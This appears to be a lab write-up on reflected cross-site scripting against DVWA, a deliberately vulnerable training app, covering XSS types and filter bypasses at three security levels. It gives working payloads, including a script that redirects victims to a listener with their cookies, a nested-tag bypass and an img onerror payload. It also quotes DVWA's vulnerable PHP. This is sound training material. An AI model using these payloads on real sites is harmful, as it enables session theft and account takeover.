# Cross Site Scripting (XSS) 📜

Cross site scripting is one of the injection vulnerability where malicous script is injected into vulnerable but trusted websites.

- Attacker can use xss to send malicous codes to user's browser.
- The end user's browser has no way of knowing teh script since it came from trusted source.
- Malicious scripts can access cookies, session tokens or other sensitive informations.

---
## Type of XSS
There are 3 types of cross site scripting:
  1. Reflected XSS
  2. Stored XSS
  3. DOM-Based XSS

Two new types to organize the type of XSS that can occur:

  - Server XSS
  - Client XSS

## Reflected XSS 

This vulnerability is caused when injected script is reflected off the web server in the form of email, search query, error message.

This attack requires social engineering.  User is tricked into clicking on a malicoius link , the injected code travels back to the web application. Which reflects the atatck to user's browser.

### Security Level: LOW

DVWA hosts a input field which takes character input from users. This is where XSS malicious script can be injected.

Like mentioned above, this attack can be used to steal cookies by passing the following carfted input.

```bash
<script> alert(document.cookie) </script>
```

The user provided input acts like a script, since there is no input sanitization.

```
<pre>Hello <script>alert(document.cookie)</script></pre>
```
  
Since we use alert function, the user cookie details are displayed on pop-up.

![image](https://github.com/user-attachments/assets/5eedbb9a-796b-4e96-9639-b9f68e3a3800)



Instead of just using alert function on user's browser, we can run a http server on port `9000` using below command.

![image](https://github.com/user-attachments/assets/e932019c-73bb-4a88-bd8f-080e6e963ac7)

We use the below crafted input as an input to inject into the website, window.location redirects the user to the mentioned ip address and port number and it will set the cookie to the value of user's cookie that we just read from the user browser.

```bash
<script>window.location='http://127.0.0.1:9000/?cookie='+ document.cookie</script>
```

Once the user is redirected, we can see the user's cookie containing sessionID, atatcker can use this information to login as user.

![image](https://github.com/user-attachments/assets/9a44ad8c-c25e-402a-b49c-da7ba977c375)


### Security Level: Medium

In this level, <script> is removed if it is supplied through user input.

```bash
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}

?>
```

The above javascript is used in this level, which indicates that "<script>" is replaced by "".

Now if we use the simple crafted input liek before `<script> alert(document.cookie) </script>`. This will not trigger a pop-up like before.

The inserted code: `<pre>Hello alert(document.cookie)</script></pre>` becomes an incomplete script because of the replace done in javascript.

We can overcome this by simply using `<script<script>>` this gets replaced to `<script>`.

```bash
<script<script>>alert(document.cookie)</script>
```

![image](https://github.com/user-attachments/assets/991ce7f7-395e-4f17-8a60-696b4dae62c8)


### Security Level: High

In this level, the script uses preg_replace() to find matching pattern and replace <script> to ''. 

```
preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] )
```

Therefore, the crafted input in medium level `<script<script>>alert(document.cookie)</script>` does not work here.

![image](https://github.com/user-attachments/assets/887de375-0b5b-4f3e-a102-f7fe3e27bcfd)

```
<pre>Hello ></pre>
```

There are other tag so instead of using <script> we can use <img>

```bash
<img src/onerror=alert(document.cookie)>
```

![image](https://github.com/user-attachments/assets/c247f80d-7a35-4851-a65d-c9c6ae6d8ee7)



References taken from:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

